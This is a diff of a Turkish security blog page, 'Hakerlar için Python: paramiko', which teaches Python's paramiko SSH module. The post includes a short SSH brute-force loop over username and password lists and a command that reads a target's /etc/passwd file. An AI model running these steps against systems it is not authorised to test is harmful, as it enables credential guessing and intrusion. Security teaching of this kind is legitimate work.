@@ -13,7 +13,30 @@
 
 
 <meta name="author" content="Yusuf Talha ARABACI">
-<meta name="description" content="Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.">
+<meta name="description" content="
+  Hakerlar için Python: paramiko
+  
+    
+    Başlık Linki
+  
+
+
+
+  Giriş
+  
+    
+    Başlık Linki
+  
+
+Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+
+  paramiko nedir?
+  
+    
+    Başlık Linki
+  
+
+SSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
 <meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
 
 
@@ -21,12 +44,14 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
   <meta name="twitter:title" content="Hakerlar için Python: paramiko">
-  <meta name="twitter:description" content="Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.">
+  <meta name="twitter:description" content="Hakerlar için Python: paramikoBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+paramiko nedir?Başlık LinkiSSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
 
 <meta property="og:url" content="http://localhost:1313/tr/posts/2022/09/hakerlar-i%C3%A7in-python-paramiko/">
   <meta property="og:site_name" content="Yusuf Talha ARABACI">
   <meta property="og:title" content="Hakerlar için Python: paramiko">
-  <meta property="og:description" content="Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.">
+  <meta property="og:description" content="Hakerlar için Python: paramikoBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+paramiko nedir?Başlık LinkiSSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
   <meta property="og:locale" content="tr">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -243,15 +268,15 @@
 </h3>
 <p>Paramiko modülü ile SSH bağlantısı kurmak için;</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>IP = &#34;ip adresi&#34;  
-USERNAME = &#34;kullanıcı adı&#34;  
-PASSWORD = &#34;şifre&#34;  
-PORT = 22  
+</code></pre><pre tabindex="0"><code>IP = &#34;ip adresi&#34;  
+USERNAME = &#34;kullanıcı adı&#34;  
+PASSWORD = &#34;şifre&#34;  
+PORT = 22  
 COMMAND = &#34;komut&#34;
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  # SSH nesnesi oluşturma  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  # SSH nesnesi oluşturma  
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-</code></pre><pre tabindex="0"><code>ssh.connect(ip, username, password) # SSH bağlantısını kurma  
-stdin, stdout, stderr = ssh.exec_command(command) # Komut çalıştırma  
+</code></pre><pre tabindex="0"><code>ssh.connect(ip, username, password) # SSH bağlantısını kurma  
+stdin, stdout, stderr = ssh.exec_command(command) # Komut çalıştırma  
 print(stdout.read())
 </code></pre><pre tabindex="0"><code>ssh.close()
 </code></pre><p>Bu örnekte pramaiko modülü ile bir SSH client’ı oluşturduk. Uygulama belirtilen ip ve port adresine kullanıcı adı ve parola bilgileri ile bir bağlantı gerçekleştirir ve ‘whoami’ komutunu çalıştırır. Ardından dönen cevabı ekrana yazdırır ve SSH bağlantısını kapatır.</p>
@@ -266,17 +291,17 @@ print(stdout.read())
 </h3>
 <p>Paramiko ile SSH bağlantısı yapabilediğimize göre bir kabaa kuvvet saldırısı da yapabiliriz. Bunun için bir kullanıcı adı listesi bir de parola listesi oluşturacağız. Ardından bu listedeki bilgiler ile SSH bağlantısı kurmaya çalışacağız.</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
-username_list = []  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+username_list = []  
 password_list = []
-</code></pre><pre tabindex="0"><code>for i in username_list:  
-    for j in password_list:  
-        try:  
-            ssh.connect(ip,username=i, password=j)  
-            print(i,j)  
-            ssh.close()  
-        except:  
+</code></pre><pre tabindex="0"><code>for i in username_list:  
+    for j in password_list:  
+        try:  
+            ssh.connect(ip,username=i, password=j)  
+            print(i,j)  
+            ssh.close()  
+        except:  
             pass
 </code></pre><p>Yukarıdaki kodda saldırı için bir kullanıcı adı listesi bir de parola listesi gerekmektedir, bunları koddaki listelere ekleyebilirsiniz. Hedef ip adresi de ssh.connect() fonskiyonuna verilmelidir. Ardından kod çalıştırıldığında, ilgili ip adresine kullanıcı adı ve parola listelerindeki değerler teker teker denenir. Bu işlemde hedef sunucuda SSH servisinin açık olduğundan emin olun. Aksi takdirde, işlem başarısız olacaktır.</p>
 <h3 id="passwd-dosyasını-çekme">
@@ -288,10 +313,10 @@ password_list = []
 </h3>
 <p>SSH bağlantısını sağladığımız taktirde, hedef sunucudan aldığımız shell ile istediğimiz işlemi yapabiliriz. Bunun için <em>ssh.exec_command()</em> metodunu kullanırız.</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
-ssh.connect(ip, username, password)  
-stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+ssh.connect(ip, username, password)  
+stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
 print(stdout.read().decode(‘ascii’))
 </code></pre><p>Yukarıdaki kod ile hedef sunucunun <em>passwd</em> dosyasını okuyup ekrana yazdırdık.</p>
 <h3 id="son">
